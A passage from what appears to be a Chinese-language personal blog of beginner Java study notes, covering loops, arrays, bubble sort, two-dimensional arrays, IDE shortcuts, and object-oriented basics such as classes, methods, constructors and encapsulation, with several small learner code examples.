src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221233148427.png" alt="image-20220221233148427"></p><h2 id="随机数公式"><a href="#随机数公式" class="headerlink" title="随机数公式"></a>随机数公式</h2><p>Math.random();         返回一个double值 [0.0,1.0]</p><p>如果我们要求 m~n的数</p><p>公式: (int)(Math.random()*(n-m+1)+m);</p><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><pre><code class="java">for 循环:    for(初始化条件;循环条件;迭代条件)&#123;        循环体        &#125;</code></pre><h2 id="break"><a href="#break" class="headerlink" title="break"></a>break</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221234457129.png" alt="image-20220221234457129"></p><h2 id="continue、return、continue的区别"><a href="#continue、return、continue的区别" class="headerlink" title="continue、return、continue的区别"></a>continue、return、continue的区别</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220221234650112.png" alt="image-20220221234650112"></p><h1 id="day5-数组"><a href="#day5-数组" class="headerlink" title="day5 数组"></a>day5 数组</h1><h2 id="数组初识"><a href="#数组初识" class="headerlink" title="数组初识"></a>数组初识</h2><p>数组: 容器 存储数据</p><p>相同类型数据的有序集合</p><h3 id="声明一个数组"><a href="#声明一个数组" class="headerlink" title="声明一个数组"></a>声明一个数组</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222000443403.png" alt="image-20220222000443403"></p><h3 id="数组初始化"><a href="#数组初始化" class="headerlink" title="数组初始化"></a>数组初始化</h3><p>两种</p><h4 id="静态初始化"><a href="#静态初始化" class="headerlink" title="静态初始化"></a>静态初始化</h4><pre><code class="java">arr = new int[]&#123;1,2,3,4,5&#125;;  int [] arr1 = new int[]&#123;1,2,3,4,5&#125;;//已经指定元素</code></pre><h4 id="动态初始化"><a href="#动态初始化" class="headerlink" title="动态初始化"></a>动态初始化</h4><pre><code class="java">arr =new int[4]; //没有指定元素double [] arrDouble = new double[5];</code></pre><p>注意:</p><p><strong>数组内元素的类型要保持一致</strong></p><h3 id="数组元素的访问"><a href="#数组元素的访问" class="headerlink" title="数组元素的访问"></a>数组元素的访问</h3><pre><code class="java">int [] arr = &#123;1,2,3&#125;;System.out.println(arr[0]);System.out.println(arr[1]);System.out.println(arr[2 ]);</code></pre><h3 id="数组长度显示"><a href="#数组长度显示" class="headerlink" title="数组长度显示"></a>数组长度显示</h3><p>arr.length 表示数组内元素的数量</p><pre><code class="java">System.out.println(arr.length);    </code></pre><p>获取最后一个元素的巧妙方法</p><pre><code class="java">System.out.println(arr[arr.length-1]);</code></pre><h2 id="数组的默认初始化"><a href="#数组的默认初始化" class="headerlink" title="数组的默认初始化"></a>数组的默认初始化</h2><p>数组声明之后，数据类型不同，数组中就会有不同的默认值</p><p>byte 0   short 0    int  0    long 0    double 0.0    float 0.0     char ‘\u0000’     boolean false</p><p>引用数据类型默认值都是null String</p><h2 id="数组的遍历"><a href="#数组的遍历" class="headerlink" title="数组的遍历"></a>数组的遍历</h2><p>1、借用for循环</p><pre><code class="java">for(int i = 0;i&lt;(arr.length-1);i++)&#123;            System.out.println(arr[i]);        &#125;</code></pre><p>2、</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222004651762.png" alt="image-20220222004651762"></p><p>代码:</p><pre><code class="java">import java.util.*;class ArrayTest&#123;     public static void main(String [] args)&#123;        int [] arr = &#123;1,2,3,4,5,6,7,8,9&#125;;        for(int i = 0;i&lt;(arr.length-1);i++)&#123;            System.out.println(arr[i]);        &#125;        System.out.println(&quot;----------------------&quot;);        for(int a :arr)&#123;            System.out.println(a);            &#125;    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222005429006.png" alt="image-20220222005429006"></p><h2 id="数组的内存划分"><a href="#数组的内存划分" class="headerlink" title="数组的内存划分"></a>数组的内存划分</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222221319026.png" alt="image-20220222221319026"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222221347039.png" alt="image-20220222221347039"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222221947302.png" alt="image-20220222221947302"></p><h2 id="数组名"><a href="#数组名" class="headerlink" title="数组名"></a>数组名</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222222235753.png" alt="image-20220222222235753"></p><h2 id="数组练习"><a href="#数组练习" class="headerlink" title="数组练习"></a>数组练习</h2><h3 id="学生成绩"><a href="#学生成绩" class="headerlink" title="学生成绩"></a>学生成绩</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222222650621.png" alt="image-20220222222650621"></p><pre><code class="java">import java.util.*;class ArrayTest&#123;    public static void main(String [] args)&#123;        int [] arr = new int[5];        Scanner input =new Scanner(System.in);        int scores = 0;        for(int i = 0;i &lt; 5;i++)&#123;            System.out.println(&quot;请输入第&quot;+(i+1)+&quot;个学生的成绩&quot;);            arr[i] = input.nextInt();            scores = scores+arr[i];        &#125;        float ave = scores/5;        System.out.println(&quot;学生的总成绩是:&quot;+scores);        System.out.println(&quot;学生的平均成绩为:&quot;+ave);                for(int i = 0;i &lt; 5;i++)&#123;            System.out.println(&quot;第&quot;+(i+1)+&quot;个学生的成绩是&quot;+arr[i]);        &#125;    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222224720430.png" alt="image-20220222224720430"></p><h3 id="数组找最值"><a href="#数组找最值" class="headerlink" title="数组找最值"></a>数组找最值</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222232917032.png" alt="image-20220222232917032"></p><pre><code class="java">import java.util.*;class ArrayTest&#123;    public static void main(String [] args)&#123;        int [] arr = &#123;85,958,235,41,-85,69,74,666,854,9644&#125;;        int one = arr[0];        for(int i = 1;i &lt; 10;i++)&#123;            if(one &lt; arr[i])&#123;                one = arr[i];            &#125;else&#123;                continue;            &#125;        &#125;        System.out.println(&quot;找到了最大的钻石，它的克拉是&quot;+one);    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222232950262.png" alt="image-20220222232950262"></p><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222233101791.png" alt="image-20220222233101791"></p><pre><code class="java">import java.util.*;class MaoPao&#123;    public static void main(String [] args)&#123;        int [] arr = &#123;85,958,235,41,-85,69,74,666,854,9644,856,884&#125;;        for(int ele :arr)&#123;            System.out.print(ele+&quot; &quot;);        &#125;        System.out.print(&quot;--&gt;&quot;);        int tmp = 0;        for(int j = 0;j&lt; (arr.length-1);j++)&#123;            for(int i = 0;i &lt; (arr.length-1);i++ )&#123;            if(arr[i] &gt; arr[i+1])&#123;                tmp = arr[i];                arr[i] = arr[i+1];                arr[i+1] = tmp;            &#125;else&#123;                continue;            &#125;        &#125;        &#125;        for(int ele :arr)&#123;            System.out.print(ele+&quot; &quot;);        &#125;    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220223002739589.png" alt="image-20220223002739589"></p><p>优化:</p><p>1、专注于处理无序部分</p><pre><code class="java">for(int j = 0;j&lt; (arr.length-1-i);j++)&#123;</code></pre><p>2、解决无效排序</p><pre><code class="java">import java.util.*;class MaoPao&#123;    public static void main(String [] args)&#123;        int [] arr = &#123;85,958,235,41,-85,69,74,666,854,9644,856,884&#125;;        for(int ele :arr)&#123;            System.out.print(ele+&quot; &quot;);        &#125;        System.out.print(&quot;--&gt;&quot;);        int tmp = 0;        for(int j = 0;j&lt; (arr.length-1);j++)&#123;            boolean flag = true;            for(int i = 0;i &lt; (arr.length-1);i++ )&#123;            if(arr[i] &gt; arr[i+1])&#123;                tmp = arr[i];                arr[i] = arr[i+1];                arr[i+1] = tmp;                flag = false;            &#125;else&#123;                continue;            &#125;        &#125;        if(flag == true)            break;        &#125;        for(int ele :arr)&#123;            System.out.print(ele+&quot; &quot;);        &#125;    &#125;    &#125;</code></pre><h1 id="day6-数组"><a href="#day6-数组" class="headerlink" title="day6 数组"></a>day6 数组</h1><h2 id="查找指定元素的下标"><a href="#查找指定元素的下标" class="headerlink" title="查找指定元素的下标"></a>查找指定元素的下标</h2><pre><code class="java">import java.util.*;class MaoPao&#123;    public static void main(String [] args)&#123;        Scanner input = new Scanner(System.in);        System.out.println(&quot;请输入您要查找的元素:&quot;);        int a = input.nextInt();        int [] arr = &#123;85,958,235,41,-85,69,74,666,854,9644,856,884&#125;;        int index = 0;        for(int i = 0;i&lt;arr.length;i++)&#123;            if(a == arr[i])&#123;                index = i;                break;            &#125;else if(i == (arr.length-1))&#123;                System.out.println(&quot;查无此数&quot;);            &#125;        &#125;        System.out.println(&quot;该元素的下标为&quot;+index);    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220224233730725.png" alt="image-20220224233730725"></p><h2 id="二维数组的声明"><a href="#二维数组的声明" class="headerlink" title="二维数组的声明"></a>二维数组的声明</h2><p>二维数组：存储一维数组的数组</p><pre><code class="java">int [][] arr; //推荐int arr[][];</code></pre><h2 id="二维数组的静态初始化"><a href="#二维数组的静态初始化" class="headerlink" title="二维数组的静态初始化"></a>二维数组的静态初始化</h2><pre><code class="java">int [][] arr = &#123;&#123;一维数组元素&#125;,&#123;一维数组元素&#125;,&#123;一维数组元素&#125;&#125;; //方式一double [][] doubleArr = new double[][]&#123;&#123;一维数组元素&#125;,&#123;一维数组元素&#125;,&#123;一维数组元素&#125;&#125;;//方式二</code></pre><h2 id="二维数组的动态初始化"><a href="#二维数组的动态初始化" class="headerlink" title="二维数组的动态初始化"></a>二维数组的动态初始化</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220224235726620.png" alt="image-20220224235726620"></p><pre><code class="java">int [][] arr = new int[5][5];</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225000442619.png" alt="image-20220225000442619"></p><p>这种一维数组可以不等长</p><pre><code class="java">double [][] doubleArr = new double[3][];doubleArr[0] = new double[](3.14,6.28);</code></pre><h2 id="二维数组的遍历"><a href="#二维数组的遍历" class="headerlink" title="二维数组的遍历"></a>二维数组的遍历</h2><h3 id="普通for循环"><a href="#普通for循环" class="headerlink" title="普通for循环"></a>普通for循环</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225001512124.png" alt="image-20220225001512124"></p><h3 id="增强for循环"><a href="#增强for循环" class="headerlink" title="增强for循环"></a>增强for循环</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225002726883.png" alt="image-20220225002726883"></p><h2 id="二维数组内存图"><a href="#二维数组内存图" class="headerlink" title="二维数组内存图"></a>二维数组内存图</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225224349397.png" alt="image-20220225224349397"></p><h2 id="二维数组练习"><a href="#二维数组练习" class="headerlink" title="二维数组练习"></a>二维数组练习</h2><pre><code class="java">122333444455555</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225224754924.png" alt="image-20220225224754924"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225224829329.png" alt="image-20220225224829329"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225224959416.png" alt="image-20220225224959416"></p><h2 id="idea的使用"><a href="#idea的使用" class="headerlink" title="idea的使用"></a>idea的使用</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225232922084.png" alt="image-20220225232922084"></p><pre><code class="windows">ctrl z 撤销ctrl y 取消撤销</code></pre><p>idea自带快捷键</p><pre><code class="java">以下写出来后+TABpsvm  写一个main方法        public static void main(String[] args) &#123;            &#125;sout  快速输出语句  System.out.println();shift + enter 快速跳到下一行CTRL D 快速删除CTRL ALT 下  快速复制ALT 上/下 快速移动代码CTRL SHIFT F 格式化代码CTRL /  快速单行注释CTRL shift / 快速多行注释</code></pre><h1 id="day7-面向对象"><a href="#day7-面向对象" class="headerlink" title="day7 面向对象"></a>day7 面向对象</h1><h2 id="面向对象思想概述"><a href="#面向对象思想概述" class="headerlink" title="面向对象思想概述"></a>面向对象思想概述</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226000438684.png" alt="image-20220226000438684"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226000448451.png" alt="image-20220226000448451"></p><h2 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226001405530.png" alt="image-20220226001405530"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226001717468.png" alt="image-20220226001717468"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226001904683.png" alt="image-20220226001904683"></p><h2 id="创建类和对象"><a href="#创建类和对象" class="headerlink" title="创建类和对象"></a>创建类和对象</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226002820722.png" alt="image-20220226002820722"></p><h3 id="类的创建"><a href="#类的创建" class="headerlink" title="类的创建"></a>类的创建</h3><pre><code class="java">[权限修饰符] class 类名&#123;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226003024771.png" alt="image-20220226003024771"></p><h3 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h3><pre><code class="java">new 类名();</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226010357542.png" alt="image-20220226010357542"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226010407353.png" alt="image-20220226010407353"></p><h2 id="创建对象内存图"><a href="#创建对象内存图" class="headerlink" title="创建对象内存图"></a>创建对象内存图</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226011045893.png" alt="image-20220226011045893"></p><h2 id="包名相关"><a href="#包名相关" class="headerlink" title="包名相关"></a>包名相关</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226011739538.png" alt="image-20220226011739538"></p><p>包名一般采用公司网址的倒序</p><p>com.guigu.项目名</p><p> com.guigu.shopping.login</p><p>java.lang不需要导包</p><p>java.sql 数据库相关</p><p>java.io  IO流相关</p><p>java.net 网络编程相关</p><p>java.util 一些核心的工具类</p><p>ALT+ENTER 可以自动导包</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228002520958.png" alt="image-20220228002520958"></p><h2 id="示例变量内存图"><a href="#示例变量内存图" class="headerlink" title="示例变量内存图"></a>示例变量内存图</h2><p>栈：存放局部变量  执行方法也会开辟空间  （存储时先进后出）</p><p>本地方法栈: 当执行native方法、c/c++ 存放局部变量、执行方法也会开辟空间</p><p>方法区: 类的信息、变量信息、方法信息、常量信息  …</p><p>堆：用来存放 对象数组等等 new出来的东西</p><p>程序计数器：用于存储下一条指令</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228012112378.png" alt="image-20220228012112378"></p><h2 id="类变量-静态变量"><a href="#类变量-静态变量" class="headerlink" title="类变量(静态变量)"></a>类变量(静态变量)</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228160600660.png" alt="image-20220228160600660"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228162715834.png" alt="image-20220228162715834"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228163846163.png" alt="image-20220228163846163"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228164036100.png" alt="image-20220228164036100"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228161831408.png" alt="image-20220228161831408"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228162235053.png" alt="image-20220228162235053"></p><h2 id="成员变量练习"><a href="#成员变量练习" class="headerlink" title="成员变量练习"></a>成员变量练习</h2><h3 id="声明一个圆的图形类"><a href="#声明一个圆的图形类" class="headerlink" title="声明一个圆的图形类"></a>声明一个圆的图形类</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228164929259.png" alt="image-20220228164929259"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228170140156.png" alt="image-20220228170140156"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228170151620.png" alt="image-20220228170151620"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228170202651.png" alt="image-20220228170202651"></p><h3 id="银行账号"><a href="#银行账号" class="headerlink" title="银行账号"></a>银行账号</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228170813217.png" alt="image-20220228170813217"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228172650120.png" alt="image-20220228172650120"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228180754684.png" alt="image-20220228180754684"></p><h3 id="两个类"><a href="#两个类" class="headerlink" title="两个类"></a>两个类</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228181325744.png" alt="image-20220228181325744"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/%5B%5DX%7D@5$I4%256U8%5B%5BX7%7B%25R8I.png" alt="img"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/R$7X6ZT$PCA5@F%EF%BF%BDAIJ28C.png" alt="img"></p><h2 id="成员变量练习内存图"><a href="#成员变量练习内存图" class="headerlink" title="成员变量练习内存图"></a>成员变量练习内存图</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301003149544.png" alt="image-20220301003149544"></p><h2 id="方法的初识"><a href="#方法的初识" class="headerlink" title="方法的初识"></a>方法的初识</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301003317796.png" alt="image-20220301003317796"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301004501890.png" alt="image-20220301004501890"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301004612778.png" alt="image-20220301004612778"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301005234732.png" alt="image-20220301005234732"></p><h2 id="形参和实参"><a href="#形参和实参" class="headerlink" title="形参和实参"></a>形参和实参</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301010731517.png" alt="image-20220301010731517"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301010415100.png" alt="image-20220301010415100"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301010426651.png" alt="image-20220301010426651"></p><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301011755061.png" alt="image-20220301011755061"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301012111930.png" alt="image-20220301012111930"></p><h2 id="实例方法"><a href="#实例方法" class="headerlink" title="实例方法"></a>实例方法</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301013731242.png" alt="image-20220301013731242"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301013553565.png" alt="image-20220301013553565"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301013625258.png" alt="image-20220301013625258"></p><h1 id="day8面向对象"><a href="#day8面向对象" class="headerlink" title="day8面向对象"></a>day8面向对象</h1><h2 id="基本类型值传递"><a href="#基本类型值传递" class="headerlink" title="基本类型值传递"></a>基本类型值传递</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301221401587.png" alt="image-20220301221401587"></p><h2 id="引用数据类型传递"><a href="#引用数据类型传递" class="headerlink" title="引用数据类型传递"></a>引用数据类型传递</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301222616500.png" alt="image-20220301222616500"></p><h2 id="数组内存图"><a href="#数组内存图" class="headerlink" title="数组内存图"></a>数组内存图</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301223516746.png" alt="image-20220301223516746"></p><h2 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h2><p>定义到方法中的变量是局部变量，局部变量只在方法中有效</p><p>局部变量在使用前必须完成初始化，否则报错</p><p>定义到类中的变量是成员变量，成员变量只在类中有效</p><p>局部变量在方法调用后，才会进行初始化，当方法执行完毕就会随方法弹栈消失</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301225248322.png" alt="image-20220301225248322"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301225548707.png" alt="image-20220301225548707"></p><h2 id="可变形参"><a href="#可变形参" class="headerlink" title="可变形参"></a>可变形参</h2><p>参数的个数可以是任意个 0~n</p><p>如何声明？</p><pre><code class="java">public static void sum(int...a)&#123;&#125;  //三个点</code></pre><p>可变形参采用数组存储实参</p><pre><code class="java">xxxxxxxxxx public static void sum(double a , int...a)&#123;&#125; </code></pre><p>不能存在两个可变参数，且可变参数必须在最后</p><h2 id="方法重载"><a href="#方法重载" class="headerlink" title="方法重载"></a>方法重载</h2><p>不同的方法可以使用相同的方法名</p><p>要求：同一类中，同一方法名，不同的形参列表：数量、顺序、类型</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302000931131.png" alt="image-20220302000931131"></p><p>方法调用时会根据不同的数据类型找到最佳匹配的方法</p><h2 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h2><p>idea</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302003110469.png" alt="image-20220302003110469"></p><p>命令行</p><pre><code class="java">class Sakura&#123;    public static void main(String [] args)&#123;        for(String ele:args)&#123;            System.out.println(ele);        &#125;    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302003703283.png" alt="image-20220302003703283"></p><h2 id="静态导入"><a href="#静态导入" class="headerlink" title="静态导入"></a>静态导入</h2><p>导入一个类中的所有静态资源</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302004244597.png" alt="image-20220302004244597"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302003831636.png" alt="image-20220302003831636"></p><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302225312848.png" alt="image-20220302225312848"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220302235022144.png" alt="image-20220302235022144"></p><h2 id="对象类型数组"><a href="#对象类型数组" class="headerlink" title="对象类型数组"></a>对象类型数组</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303001402384.png" alt="image-20220303001402384"></p><h2 id="封装的概念及四个权限修饰符的概念"><a href="#封装的概念及四个权限修饰符的概念" class="headerlink" title="封装的概念及四个权限修饰符的概念"></a>封装的概念及四个权限修饰符的概念</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303215651821.png" alt="image-20220303215651821"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303215810126.png" alt="image-20220303215810126"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303220134500.png" alt="image-20220303220134500"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303220910747.png" alt="image-20220303220910747"></p><h2 id="属性的简单封装"><a href="#属性的简单封装" class="headerlink" title="属性的简单封装"></a>属性的简单封装</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303221632106.png" alt="image-20220303221632106"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303221931211.png" alt="image-20220303221931211"></p><h1 id="day9面向对象"><a href="#day9面向对象" class="headerlink" title="day9面向对象"></a>day9面向对象</h1><h2 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h2><p>可以快速给成员变量赋值</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303231205347.png" alt="image-20220303231205347"></p><p>创建类</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303231339865.png" alt="image-20220303231339865"></p><p>构造</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303231528049.png" alt="image-20220303231528049"></p><p>每一个类都会有一个无参构造器，但是当声明有参构造器后，默认无参构造器就会消失，这时候如果再写</p><pre><code class="java">Student s = new Student();</code></pre><p>就会报错。所以建议自定义类都再提供一个无参构造器。</p><p>使用构造器创建对象</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303232035228.png" alt="image-20220303232035228"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220303233229581.png" alt="image-20220303233229581"></p><h2 id="对属性的封装"><a href="#对属性的封装" class="headerlink" title="对属性的封装"></a>对属性的封装</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304004650481.png" alt="image-20220304004650481"></p><p>要对用户的信息进行校验</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304005044933.png" alt="image-20220304005044933"></p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220304005720701.png" alt="image-20220304005720701"></p><pre><code class="java">//Staff.javapackage com.sakura.staff;public class Staff &#123;    private int num;    private char sex;    private double salary;    private String name;    public Staff(int a, String b, char c, double d)&#123;        this.num = a;        this.name = b;        this.sex = c;        this.salary = d;    &#125;    public Staff()&#123;&#125;    void setinfo(int a,String b,char c,double d)&#123;        this.num = a;        this.name = b;        this.sex = c;        this.salary = d;    &#125;    void getinfo()&#123;        System.out.println(&quot;num = &quot; + num);        System.out.println(&quot;name = &quot; + name);        System.out.println(&quot;sex = &quot; + sex);        System.out.println(&quot;salary = &quot; + salary);    &#125;&#125;</code></pre><pre><code class="java">//Test.javapackage com.sakura.staff;public class Test &#123;    public static 